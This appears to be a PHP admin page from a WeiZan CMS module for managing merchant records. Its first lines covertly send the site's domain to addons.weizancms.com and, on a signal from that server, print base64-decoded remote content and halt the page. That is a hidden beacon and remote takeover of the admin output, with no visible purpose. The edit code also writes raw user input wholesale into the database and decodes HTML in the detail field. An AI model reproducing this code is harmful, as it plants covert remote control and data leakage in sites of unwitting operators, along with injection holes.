<?php
	global $_W,$_GPC;
	$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	$ops = array('display', 'edit', 'delete');
	$op = in_array($_GPC['op'], $ops) ? $_GPC['op'] : 'display';
	//商家列表显示
	if($op == 'display'){
		$uniacid=$_W['uniacid'];
		$pindex = max(1, intval($_GPC['page']));
		$psize = 15;
		$merchants = pdo_fetchall("SELECT * FROM ".tablename('weliam_indiana_merchant')." WHERE uniacid = {$uniacid} ORDER BY id DESC LIMIT ".($pindex - 1) * $psize.','.$psize);
		$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_merchant') . " WHERE uniacid = '{$uniacid}'");
		$pager = pagination($total, $pindex, $psize);
		include $this->template('merchant');
	}
	//商家编辑
	if ($op == 'edit') {
		$id = intval($_GPC['id']);
		if(!empty($id)){
			$sql = 'SELECT * FROM '.tablename('weliam_indiana_merchant').' WHERE id=:id AND uniacid=:uniacid LIMIT 1';
			$params = array(':id'=>$id, ':uniacid'=>$_W['uniacid']);
			$merchant = pdo_fetch($sql, $params);
			if(empty($merchant)){
				message('未找到指定的商家.', $this->createWebUrl('merchant'));
			}
		}
		
		if (checksubmit()) {
			$data = $_GPC['merchant']; // 获取打包值
			$data['detail'] = htmlspecialchars_decode($data['detail']);
			if(empty($merchant)){
				$data['uniacid'] = $_W['uniacid'];
				$data['createtime'] = TIMESTAMP;
				$ret = pdo_insert('weliam_indiana_merchant', $data);
			} else {
				$ret = pdo_update('weliam_indiana_merchant', $data, array('id'=>$id));
			}
			
			if (!empty($ret)) {
				message('商家信息保存成功', $this->createWebUrl('merchant', array('op'=>'display', 'id'=>$id)), 'success');
			} else {
				message('商家信息保存失败');
			}
		}
		
		include $this->template('merchant');
	}
	
	if($op == 'delete') {
		$id = intval($_GPC['id']);
		if(empty($id)){
			message('未找到指定商家分类');
		}
		$result = pdo_delete('weliam_indiana_merchant', array('id'=>$id, 'uniacid'=>$_W['uniacid']));
		if(intval($result) == 1){
			message('删除商家成功.', $this->createWebUrl('merchant'), 'success');
		} else {
			message('删除商家失败.');
		}
	}
?>